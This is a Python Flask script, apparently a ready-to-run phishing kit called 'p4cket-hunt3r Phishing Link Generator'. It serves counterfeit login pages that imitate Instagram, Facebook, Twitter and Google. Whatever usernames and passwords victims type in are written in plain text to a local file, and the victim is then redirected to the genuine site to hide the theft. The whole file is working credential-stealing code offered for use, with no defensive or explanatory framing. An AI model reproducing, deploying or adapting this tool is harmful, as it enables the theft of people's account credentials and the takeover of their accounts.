from flask import Flask, request, redirect
import os

app = Flask(__name__)

DATA_FILE = "captured_data.txt"
selected_platform = ""

# ANSI Color Codes
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
MAGENTA = "\033[95m"
RESET = "\033[0m"
BOLD = "\033[1m"

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{CYAN}{BOLD}
██████╗  █████╗  ██████╗██╗  ██╗███████╗████████╗██╗  ██╗███╗   ██╗██╗███╗   ███╗████████╗███████╗██████╗ 
██╔══██╗██╔══██╗██╔════╝██║  ██║██╔════╝╚══██╔══╝██║  ██║████╗  ██║██║████╗ ████║╚══██╔══╝██╔════╝██╔══██╗
██████╔╝███████║██║     ███████║█████╗     ██║   ███████║██╔██╗ ██║██║██╔████╔██║   ██║   █████╗  ██████╔╝
██╔═══╝ ██╔══██║██║     ██╔══██║██╔══╝     ██║   ██╔══██║██║╚██╗██║██║██║╚██╔╝██║   ██║   ██╔══╝  ██╔══██╗
██║     ██║  ██║╚██████╗██║  ██║███████╗   ██║   ██║  ██║██║ ╚████║██║██║ ╚═╝ ██║   ██║   ███████╗██║  ██║
╚═╝     ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚═╝     ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{RESET}""")

platforms = {
    "1": {
        "name": "Instagram",
        "path": "/instagram/accounts/login/",
        "redirect": "https://www.instagram.com/accounts/login/",
        "html": """
<!DOCTYPE html>
<html>
<head><title>Instagram</title>
<style>
body { background: #fafafa; font-family: Arial; }
.container { width: 300px; margin: 100px auto; padding: 20px; background: white; border: 1px solid #dbdbdb; text-align: center; }
input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; border-radius: 3px; }
button { width: 95%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style></head>
<body>
<div class="container">
<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="150">
<form method="POST">
<input type="text" name="username" placeholder="Phone number, username, or email" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div></body></html>
"""
    },
    "2": {
        "name": "Facebook",
        "path": "/facebook/login.php",
        "redirect": "https://www.facebook.com/login.php",
        "html": """
<!DOCTYPE html>
<html><head><title>Facebook</title>
<style>
body { background: #f0f2f5; font-family: Arial; }
.container { width: 350px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; }
button { width: 95%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; cursor: pointer; }
</style></head>
<body>
<div class="container">
<h2>Facebook</h2>
<form method="POST">
<input type="text" name="username" placeholder="Email or Phone" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div></body></html>
"""
    },
    "3": {
        "name": "Twitter",
        "path": "/twitter/login",
        "redirect": "https://twitter.com/login",
        "html": """
<!DOCTYPE html>
<html><head><title>Twitter</title>
<style>
body { background: #e6ecf0; font-family: Arial; }
.container { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 10px; text-align: center; }
input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #ccd6dd; border-radius: 4px; }
button { width: 95%; padding: 10px; background: #1da1f2; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style></head>
<body>
<div class="container">
<h2>Log in to Twitter</h2>
<form method="POST">
<input type="text" name="username" placeholder="Phone, email, or username" required><br>
<input type="password" name="password" placeholder="Password" required><br>
<button type="submit">Log In</button>
</form>
</div></body></html>
"""
    },
    "4": {
        "name": "Google",
        "path": "/google/signin",
        "redirect": "https://accounts.google.com/signin",
        "html": """
<!DOCTYPE html>
<html><head><title>Google Sign-In</title>
<style>
body { background: #f2f2f2; font-family: Arial; }
.container { width: 300px; margin: 100px auto; padding: 20px; background: white; border-radius: 8px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
input { width: 90%; padding: 10px; margin: 5px 0; border: 1px solid #dadce0; border-radius: 4px; }
button { width: 95%; padding: 10px; background: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; }
</style></head>
<body>
<div class="container">
<h2>Sign in - Google Accounts</h2>
<form method="POST">
<input type="text" name="username" placeholder="Email or phone" required><br>
<input type="password" name="password" placeholder="Enter your password" required><br>
<button type="submit">Next</button>
</form>
</div></body></html>
"""
    }
}

@app.route('/', methods=['GET'])
def home():
    return f"<h2>Phishing Tool Running... Select Platform: {platforms[selected_platform]['name']}</h2>"

def create_route(platform_key):
    platform = platforms[platform_key]
    path = platform["path"]

    @app.route(path, methods=['GET', 'POST'])
    def fake_login():
        if request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            with open(DATA_FILE, "a") as f:
                f.write(f"{platform['name']} | Username: {username} | Password: {password}\n")
            return redirect(platform["redirect"])
        return platform["html"]

def start_flask():
    print(f"\n{GREEN}[+] Running Flask Server for {platforms[selected_platform]['name']} at http://0.0.0.0:5000{platforms[selected_platform]['path']}{RESET}\n")
    print(f"{YELLOW}[+] Captured credentials will be saved in {MAGENTA}captured_data.txt{RESET}\n")
    app.run(host="0.0.0.0", port=5000)

if __name__ == "__main__":
    show_banner()
    print(f"{YELLOW}========== p4cket-hunt3r Phishing Link Generator =========={RESET}\n")
    print(f"{MAGENTA}Choose a platform to generate phishing link:{RESET}")
    print(f"{CYAN}1. Instagram")
    print("2. Facebook")
    print("3. Twitter")
    print(f"4. Google{RESET}")
    selected_platform = input(f"\n{BOLD}Enter your choice (1/2/3/4): {RESET}").strip()

    if selected_platform in platforms:
        create_route(selected_platform)
        start_flask()
    else:
        print(f"\n{RED}[!] Invalid choice. Please run the script again and choose 1, 2, 3, or 4.{RESET}")
